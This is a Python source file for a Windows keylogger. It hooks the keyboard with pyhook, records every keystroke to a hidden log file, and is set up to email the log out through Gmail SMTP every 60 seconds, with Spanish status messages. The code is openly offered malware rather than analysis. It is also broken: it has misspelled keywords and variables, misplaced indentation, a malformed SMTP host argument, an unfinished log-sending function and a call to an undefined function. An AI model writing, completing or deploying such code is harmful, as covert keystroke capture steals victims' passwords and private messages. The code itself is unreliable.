import pyhook, pythoncom, sys, logging
import time, datetime

wait_seconds = 60
timeout = time.time() + wait_seconds
file_log = "c:\\secret\\dat.txt"

def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False
    
def Sendmail(user, pwd, recipient, subject, body):
    import smtplib

    gmail_usser = user
    gmail_pass  = pwd
    FROM = user
    to = recipient if type(recipient) is list else (recipient)
    SUBJECT = subject
    TEXT = body

message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
""" %(FROM, ", ".join(TO), SUBJECT, TEXT)
 try:
    server = smtplib.SMTP("smtp.gmail.com, 587")
    server.ehlo()
    server.starttls()
    server.login(gmail_user, gmail_pass)
    server.sendmail(FROM, TO, message)
    server.close()
    print("correo enviado satisfactoriamente")
 except:
    print("Error al mandar correo") 

def FormatAndSendLogEmail ():
    whith open(file_log, "r+") as f:
          actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    




def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG,
                        format = "%(message)s")
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyhook.HookManager()
hooks_manager.keyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if TimeOut():
        FormatAndSendEmail()
        timeout = time.time() + wait_seconds

    pythoncom.PumpWaitingMessages()




